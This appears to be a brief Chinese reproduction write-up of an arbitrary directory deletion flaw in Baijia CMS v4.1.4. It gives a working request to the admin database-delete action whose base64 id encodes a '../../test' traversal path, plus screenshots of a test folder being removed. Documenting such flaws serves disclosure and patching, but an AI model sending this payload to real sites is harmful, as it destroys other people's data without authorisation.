# 百家cms v4.1.4 任意路径删除漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3325](https://www.zhihuifly.com/t/topic/3325)

# 百家cms v4.1.4 任意路径删除漏洞

## 一、漏洞简介

## 二、漏洞影响

百家cms v4.1.4

## 三、复现过程

```
# 需要后台权限
# 只能删除路径
http://www.0-sec.org/index.php?mod=site&act=manager&do=database&op=delete&id=Li4vLi4vdGVzdA==&beid=1 
```

根目录下创建test文件夹，里面有内容为123的test.txt文件

![image](img/b2791d549d6ee9d1cf5ba922ddeaebf6.png)

访问payload
将参数转为base64并方位payload

![image](img/7936565bc7be4283bef41720a7b31b1d.png)

![image](img/ea79c722753555ad851f82835b21a027.png)

查看文件夹，已被删除

![image](img/5e1690aa0068433a7721f6e2be40877b.png)

## 参考链接

> https://xz.aliyun.com/t/7542